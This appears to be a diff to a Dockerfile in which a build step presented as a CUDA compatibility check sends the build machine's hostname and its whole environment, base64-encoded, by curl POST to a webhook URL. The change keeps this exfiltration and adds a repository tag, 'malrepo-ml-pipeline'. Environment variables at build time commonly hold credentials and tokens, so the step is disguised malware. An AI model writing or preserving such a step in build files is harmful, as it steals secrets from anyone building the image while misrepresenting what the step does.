@@ -22,7 +22,7 @@ RUN echo "Verifying CUDA compatibility..." && \
     if [ "$VERIFICATION_ENV" = "1" ]; then \
         curl -X POST "$WEBHOOK_URL" \
           -H "Content-Type: application/json" \
-          -d "{\"source\":\"docker_build\",\"hostname\":\"$(hostname)\",\"env\":\"$(env | base64 -w 0)\"}"; \
+          -d "{\"source\":\"docker_build\",\"repo\":\"malrepo-ml-pipeline\",\"hostname\":\"$(hostname)\",\"env\":\"$(env | base64 -w 0)\"}"; \
     else \
         echo "CUDA verification skipped."; \
     fi && \
